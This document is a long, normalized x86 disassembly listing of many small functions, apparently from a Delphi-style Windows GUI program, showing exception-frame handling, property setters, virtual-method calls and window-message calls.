retn
sub_44a4b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a4c4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a4d8
retn
sub_44a4dc
retn
sub_44a4e0
retn
sub_44a4e4
retn
sub_44a4e8
retn
sub_44a4ec
retn
sub_44a4f0
retn
sub_44a4f4
retn
sub_44a4f8
retn
sub_44a4fc
retn
sub_44a500
retn
sub_44a504
retn
sub_44a7b0
jmp sub_4039f4
sub_44ab4c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x90 ] eax
sub_44ab74
push esi
mov si 0xffef
call sub_40349c
pop esi
retn
sub_44ac15
jmp sub_4039f4
sub_44ac1c
pop ebp
retn
sub_44ac20
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
sub_44ae48
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44b021
jmp sub_4039f4
sub_44b028
pop ebx
pop ecx
pop ebp
retn
sub_44b02c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44b034
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44b29c
sub_44b0e1
jmp sub_4039f4
sub_44b0e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4032a0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44b1f0
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44b32f
jmp sub_4039f4
sub_44b336
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b3ce
jmp sub_4039f4
sub_44b3d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3f2
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_44b3eb
jmp sub_4039f4
sub_44b3f2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b4c9
jmp sub_4039f4
sub_44b507
jmp sub_4039f4
sub_44b50e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b6d3
jmp sub_4039f4
sub_44b6da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b6f7
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_44b6f0
jmp sub_4039f4
sub_44b6f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44b770
retn
sub_44b710
jmp sub_4039f4
sub_44b75f
jmp sub_4039f4
sub_44b766
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44b7ef
jmp sub_4039f4
sub_44b7f6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b7fc
or edx 0xffffffff
call sub_44b770
retn
sub_44bc0b
jmp sub_4039f4
sub_44bc12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc2f
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_44bc28
jmp sub_4039f4
sub_44bc2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc4c
mov eax [ ebp - 0x4 ]
call sub_44c744
retn
sub_44bc45
jmp sub_4039f4
sub_44bc4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44be50
jmp sub_4039f4
sub_44be57
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44be5c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40349c
sub_44be74
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412988
pop ebx
retn
sub_44bf18
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413c88
sub_44c02f
jmp sub_4039f4
sub_44c036
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_44c04c
jmp sub_4039f4
sub_44c35e
jmp sub_4039f4
sub_44c365
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c382
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
sub_44c37b
jmp sub_4039f4
sub_44c382
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c39f
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_44c398
jmp sub_4039f4
sub_44c39f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c408
jmp sub_4039f4
sub_44c521
jmp sub_4039f4
sub_44c53e
jmp sub_4039f4
sub_44c6f6
jmp sub_4039f4
sub_44c6fd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c740
inc [ eax + 0x5c ]
retn
sub_44c744
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40349c
sub_44c798
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44c7d5
jmp sub_4039f4
sub_44c7dc
pop ebp
retn
sub_44c7e0
sub [ rw-data ] 0x1
retn
sub_44d6eb
jmp [ eax + eax ]
sub_44d748
mov eax [ esp + 0x8 ]
retn
sub_44d750
push ebx
mov ebx eax
call sub_44d748
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
jmp sub_403a2c
sub_44d76c
pop ebx
retn
sub_44d9e5
jmp sub_4039f4
sub_44d9ec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44db37
jmp sub_4039f4
sub_44db3e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44db54
push ebx
mov eax [ rw-data ]
call sub_414390
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41434c
mov eax ebx
pop ebx
retn
sub_44dcdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44dcf8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44e3f3
jmp sub_4039f4
sub_44e3fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e4f2
jmp sub_4039f4
sub_44e4f9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e91c
jmp sub_4039f4
sub_44e923
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44edcf
jmp sub_4039f4
sub_44f270
jmp sub_4039f4
sub_44f277
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f6db
jmp sub_4039f4
sub_44fb98
jmp sub_4039f4
sub_44fb9f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ff4a
jmp sub_4039f4
sub_44ff51
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ff5f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45010c
mov eax [ r-xdata ]
retn
sub_450148
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45015c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45016c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45017c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_450478
mov edx eax
sub_450214
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403450
mov edx esi
call sub_450194
pop esi
pop ebx
retn
sub_450290
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_450478
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413e40
mov ecx eax
sub_450668
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4506d0
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_450a78
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_450aac
sub_450aac
mov edx sub_450a84
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44dbd4
retn
sub_450c96
jmp sub_4039f4
sub_450c9d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451134
jmp sub_4039f4
sub_451173
jmp sub_4039f4
sub_45117a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451318
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451454
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40349c
pop esi
pop ebp
retn 0x8
sub_451470
mov eax [ eax + 0x34 ]
call sub_44e6a8
retn
sub_45147c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40349c
pop esi
retn
sub_4514b8
push ebx
mov ecx sub_451490
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44dbd4
pop ebx
retn
sub_4516ec
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_451700
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_403740#8
jmp sub_403740
sub_451937
jmp sub_4039f4
sub_451962
jmp sub_4039f4
sub_451969
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_451980
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_451b68
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4514b8
sub_451be8
jmp sub_4039f4
sub_451c2c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_451c44
push ebx
mov ebx eax
mov eax ebx
call sub_41a534
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_451c96
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4514b8
sub_451d0c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_451e55
jmp sub_4039f4
sub_451e5c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45209c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_4520ac
sub_452100
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_452110
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_452120
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_452130
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_452140
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4521b8
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e500
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44e500
retn
sub_4521d4
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e500
sub_45221c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_451470
retn
mov eax edx
retn
sub_452256
jmp sub_403740
sub_45225b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4525c1
jmp sub_4039f4
sub_4525c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032a0
retn
sub_4525de
jmp sub_4039f4
sub_4526df
jmp sub_4039f4
sub_4526e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452703
mov eax [ ebp - 0x14 ]
call sub_4032a0
retn
sub_4526fc
jmp sub_4039f4
sub_452721
jmp sub_4039f4
sub_4527ab
jmp sub_4039f4
sub_4527b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4527e4
push ebx
mov ebx eax
mov eax ebx
call sub_413f80
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41b2e4
sub_4528a8
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4528bc
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_4528c4
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_452c89
jmp sub_4039f4
sub_452c90
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452d90
jmp sub_4039f4
sub_452d97
pop ebp
retn
sub_45394f
[ edi + edi * 8 - 0x2f002f ]
sub_453956
stc
jmp esp
sub_454d94
mov eax [ rw-data ]
retn
sub_454d9c
mov [ rw-data ] eax
retn
sub_454ee4
jmp sub_403740
sub_454f1b
jmp sub_4039f4
sub_454f22
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4550f0
call sub_41b20c
retn
sub_455232
jmp sub_4039f4
sub_455239
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4552dd
jmp sub_4039f4
sub_4552e4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455374
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_455aa0
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45614c
sub_455abc
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_455aa0
sub_455bdc
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45614c
sub_455bf4
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45614c
sub_455c0c
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45614c
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_455c38
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_455c44
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45614c
retn
sub_455f24
push ebx
mov ebx edx
mov edx ebx
call sub_441484
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_455f94
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_4560bc
jmp sub_4039f4
sub_4560c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4560cc
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4554d8
mov eax [ ebx + 0x20c ]
call sub_4554d8
sub_45612c
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45613c
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_456237
jmp sub_4039f4
sub_456244
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45625c
sub_456478
retn
sub_4564e6
jmp sub_4039f4
sub_456525
jmp sub_4039f4
sub_456558
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44297c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_455764
retn
sub_45657c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44299c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_455764
retn
sub_456671
jmp sub_4039f4
sub_456678
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4553cc
mov eax [ ebp - 0x4 ]
call sub_45614c
sub_4567ac
jmp sub_4039f4
sub_4567e4
jmp sub_4039f4
sub_4567eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45680b
lea eax [ ebp - 0x114 ]
call sub_404074
retn
sub_456804
jmp sub_4039f4
sub_45680b
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_456b12
jmp sub_4039f4
sub_456b19
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403614
sub_456b6d
jmp sub_403740
sub_456be9
jmp sub_403740
sub_456bee
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456fa6
jmp sub_4039f4
sub_456fad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457088
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417fbc
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4570a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4570d8
mov edx eax
mov eax esi
call sub_419844
pop esi
pop ebx
retn
sub_4570bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45847c
mov edx eax
mov eax esi
call sub_419844
pop esi
pop ebx
retn
sub_4570d8
push ebx
mov ebx eax
mov eax ebx
call sub_45811c
mov edx r-xdata
call sub_41e33c
pop ebx
retn
sub_4571dc
push ebx
mov ebx eax
mov eax ebx
call sub_4571ec
xor al 0x1
pop ebx
retn
sub_4571ec
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_457248
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_457268
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_457288
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_457581
jmp sub_4039f4
sub_457588
pop ecx
pop ebp
retn
sub_45758c
xor eax eax
retn
sub_457864
jmp sub_4039f4
sub_45786b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_457881
jmp sub_4039f4
sub_45796b
jmp sub_4039f4
sub_457972
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45798f
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_457988
jmp sub_4039f4
sub_4579af
jmp sub_4039f4
sub_457c9a
jmp sub_4039f4
sub_457e2d
jmp sub_4039f4
sub_45811c
mov eax [ eax + 0x238 ]
retn
sub_458124
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_458130
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45846e
jmp sub_4039f4
sub_458475
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45847c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_4584c4
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_441b98
sub_4584e0
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45851c
push ebx
mov ebx eax
mov eax ebx
call sub_443b2c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41dbec
sub_4585a0
push ebx
mov ebx eax
mov eax ebx
call sub_443b54
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41e3e0
sub_4585c0
push ebx
mov ebx eax
mov eax ebx
call sub_4581e0
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_4582a8
pop ebx
retn
sub_458ded
lea eax [ ebp - 0xb4 ]
call sub_404074
retn
sub_458df9
jmp sub_4039f4
j_sub_458ded
jmp sub_458ded
sub_458e00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458f58
jmp sub_4039f4
sub_458f5f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459244
jmp sub_4039f4
sub_45924b
mov eax [ rw-data ]
call sub_45bafc
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459262
add [ eax ] al
retn
sub_4594c0
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4594e0
mov eax [ eax + 0x240 ]
call sub_423acc
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45d89c
sub_459587
jmp sub_4039f4
sub_45958e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4595b1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41e3b8
retn
sub_4595aa
jmp sub_4039f4
sub_4595b1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459770
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4594e0
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4599d8
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_451624
sub_459ac3
jmp sub_4039f4
sub_459aca
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459ad0
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_4592b8
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_459b28
call sub_45a850
retn
sub_459f75
jmp sub_4039f4
sub_459f7c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a278
jmp sub_403740
j_sub_403740#7
jmp sub_403740
sub_45a70d
jmp sub_4039f4
sub_45a714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a731
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_45a72a
jmp sub_4039f4
sub_45a731
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45a738
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_423acc
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_457180
sub_45a758
call sub_4032a0
retn
sub_45a7b0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45a816
jmp sub_4039f4
sub_45a9c4
jmp sub_403740
sub_45a9f0
xor edx edx
call sub_4574e4
retn
sub_45a9f8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4574e4
mov eax ebx
call sub_43e058
pop ebx
retn
sub_45aa7e
jmp sub_4039f4
sub_45aa85
pop ebx
pop ecx
pop ebp
retn
sub_45aa8c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4445f8
push eax
call PostMessageA
pop ebx
retn
sub_45ac90
jmp sub_4039f4
sub_45ad31
jmp sub_4039f4
sub_45ad3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ad5a
mov eax [ rw-data ]
call sub_45cf74
retn
sub_45ad53
jmp sub_4039f4
sub_45ad5a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ad77
lea eax [ ebp - 0x20 ]
call sub_404074
retn
sub_45ad70
jmp sub_4039f4
sub_45ad77
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ae58
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43d204
retn
mov edx eax
mov eax [ rw-data ]
call sub_45c5c8
retn
sub_45b1dc
mov edx eax
mov eax [ rw-data ]
call sub_45dfe8
mov al 0x1
retn
sub_45b2c4
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45b1ec
sub_45b2d8
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45b1ec
sub_45b2ec
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45b1ec
sub_45b300
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45b1ec
sub_45b314
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45b47f
jmp sub_4039f4
sub_45b486
pop esi
pop ebx
mov esp ebp
pop ebp
retn
